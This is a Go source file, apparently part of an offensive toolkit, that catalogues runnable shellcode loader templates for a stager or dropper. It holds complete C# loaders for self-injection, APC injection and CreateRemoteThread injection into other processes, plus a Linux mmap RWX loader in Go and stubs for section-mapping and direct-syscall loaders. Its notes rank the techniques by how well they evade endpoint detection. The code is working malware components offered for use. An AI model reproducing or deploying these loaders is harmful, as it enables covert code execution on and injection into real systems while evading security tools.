// Package payload ships runnable loader templates — the pieces a stager
// or dropper hands to a compiler at runtime. Go analogue of
// Program/payload/. Data package: holds source strings, no execution.
package payload

// Lang identifies the loader source language.
type Lang string

const (
	LangCSharp Lang = "csharp"
	LangCPP    Lang = "cpp"
	LangPS     Lang = "powershell"
	LangGo     Lang = "go"
)

// Template is one loader source.
type Template struct {
	Name     string
	Lang     Lang
	Platform string
	Notes    string
	Body     string
}

// VirtualAllocLoaderCSharp — classic. Allocate RWX, copy shellcode,
// CreateThread, wait.
const VirtualAllocLoaderCSharp = `// C# — VirtualAlloc + Marshal.Copy + CreateThread loader
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class Loader {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateThread(IntPtr attr, uint stackSize, IntPtr start, IntPtr param, uint flags, IntPtr tid);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint WaitForSingleObject(IntPtr handle, uint ms);

    public static void Run(byte[] shellcode) {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}`

// APCInjectionCSharp — queue an APC on an existing thread instead of
// spawning a new one. Smaller detection surface.
const APCInjectionCSharp = `// C# — APC injection: QueueUserAPC on a target thread
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class APC {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out uint written);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint QueueUserAPC(IntPtr apcFunc, IntPtr thread, IntPtr data);

    public static void Run(int pid, uint tid, byte[] shellcode) {
        IntPtr proc = OpenProcess(0x1F0FFF, false, pid);
        IntPtr mem = VirtualAllocEx(proc, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        uint written;
        WriteProcessMemory(proc, mem, shellcode, (uint)shellcode.Length, out written);
        IntPtr thread = OpenThread(0x0010, false, tid);
        QueueUserAPC(mem, thread, IntPtr.Zero);
    }
}`

// RemoteThreadCSharp — CreateRemoteThread + VirtualAllocEx +
// WriteProcessMemory. Most-detected but most reliable.
const RemoteThreadCSharp = `// C# — CreateRemoteThread injection
using System;
using System.Runtime.InteropServices;

public class RemoteThread {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out uint written);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr, uint stackSize, IntPtr start, IntPtr param, uint flags, IntPtr tid);

    public static void Run(int pid, byte[] shellcode) {
        IntPtr proc = OpenProcess(0x1F0FFF, false, pid);
        IntPtr mem = VirtualAllocEx(proc, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        uint written;
        WriteProcessMemory(proc, mem, shellcode, (uint)shellcode.Length, out written);
        CreateRemoteThread(proc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    }
}`

// SelfInjectCSharp — VirtualAlloc, copy, then a delegate cast for the
// call instead of CreateThread. No thread creation.
const SelfInjectCSharp = `// C# — self-inject with delegate call (no CreateThread)
using System;
using System.Runtime.InteropServices;

public class SelfInject {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint allocType, uint protect);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void Entry();

    public static void Run(byte[] shellcode) {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        Entry entry = (Entry)Marshal.GetDelegateForFunctionPointer(mem, typeof(Entry));
        entry();
    }
}`

// SectionInjectCSharp — NtCreateSection + NtMapViewOfSection shared
// mapping. No WriteProcessMemory call.
const SectionInjectCSharp = `// C# — NtCreateSection + NtMapViewOfSection injection
// Local section with shellcode, then map into the target process.
// Avoids WriteProcessMemory, smaller detection surface.
using System;
using System.Runtime.InteropServices;

public class SectionInject {
    [DllImport("ntdll.dll")]
    static extern int NtCreateSection(out IntPtr section, uint access, IntPtr attr, ref long maxSize, uint prot, uint alloc, IntPtr file);
    [DllImport("ntdll.dll")]
    static extern int NtMapViewOfSection(IntPtr section, IntPtr proc, ref IntPtr baseAddr, UIntPtr zeroBits, UIntPtr commit, out IntPtr viewSize, uint inherit, uint alloc, uint prot);
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    // full impl: allocate a local section, write the shellcode, map into
    // the target, then start it via a remote thread or APC
}`

// DirectSyscallLoaderCPP — bypass userland hooks by emitting the syscall
// stub inline.
const DirectSyscallLoaderCPP = `// C++ — direct syscall VirtualAlloc loader
// SSN resolved at runtime from a fresh ntdll image.
//
// Steps: NtAllocateVirtualMemory, NtWriteVirtualMemory,
// NtCreateThreadEx — each via a hand-built syscall stub.

extern "C" NTSTATUS DirectNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);`

// GoLoader — Go-native loader that runs shellcode via syscall on Linux.
const GoLoader = `// Go — Linux syscall-based mmap loader
// Maps an RWX region, copies the shellcode, calls it.
package main

import (
	"syscall"
	"unsafe"
)

func Run(shellcode []byte) error {
	mem, _, errno := syscall.Syscall6(
		syscall.SYS_MMAP,
		0, uintptr(len(shellcode)),
		uintptr(syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC),
		uintptr(syscall.MAP_PRIVATE|syscall.MAP_ANON),
		^uintptr(0), 0,
	)
	if errno != 0 {
		return errno
	}
	for i, b := range shellcode {
		*(*byte)(unsafe.Pointer(mem + uintptr(i))) = b
	}
	// cast to func and call
	entry := *(*func())(unsafe.Pointer(&mem))
	entry()
	return nil
}`

// Templates is the catalogue of all shipped loaders.
var Templates = []Template{
	{
		Name:     "virtualalloc_csharp",
		Lang:     LangCSharp,
		Platform: "windows",
		Notes:    "Classic RWX allocate + CreateThread. Simple, well-detected by modern EDRs.",
		Body:     VirtualAllocLoaderCSharp,
	},
	{
		Name:     "apc_injection_csharp",
		Lang:     LangCSharp,
		Platform: "windows",
		Notes:    "QueueUserAPC on an existing thread. Needs the target thread to hit an alertable wait.",
		Body:     APCInjectionCSharp,
	},
	{
		Name:     "remote_thread_csharp",
		Lang:     LangCSharp,
		Platform: "windows",
		Notes:    "CreateRemoteThread — most detected but most reliable.",
		Body:     RemoteThreadCSharp,
	},
	{
		Name:     "self_inject_csharp",
		Lang:     LangCSharp,
		Platform: "windows",
		Notes:    "Delegate call instead of CreateThread. No new thread, harder to correlate.",
		Body:     SelfInjectCSharp,
	},
	{
		Name:     "section_inject_csharp",
		Lang:     LangCSharp,
		Platform: "windows",
		Notes:    "NtCreateSection + NtMapViewOfSection. No WriteProcessMemory.",
		Body:     SectionInjectCSharp,
	},
	{
		Name:     "direct_syscall_cpp",
		Lang:     LangCPP,
		Platform: "windows",
		Notes:    "Direct syscall loader. Bypasses userland hooks. Needs indirect pattern for hardened stacks.",
		Body:     DirectSyscallLoaderCPP,
	},
	{
		Name:     "go_mmap_loader",
		Lang:     LangGo,
		Platform: "linux",
		Notes:    "Go-native mmap + RWX + call. Smallest surface for a Linux loader.",
		Body:     GoLoader,
	},
}

// ByName returns the template with the given name.
func ByName(name string) (Template, bool) {
	for _, t := range Templates {
		if t.Name == name {
			return t, true
		}
	}
	return Template{}, false
}

// ByPlatform returns every template for a platform.
func ByPlatform(p string) []Template {
	var out []Template
	for _, t := range Templates {
		if t.Platform == p {
			out = append(out, t)
		}
	}
	return out
}
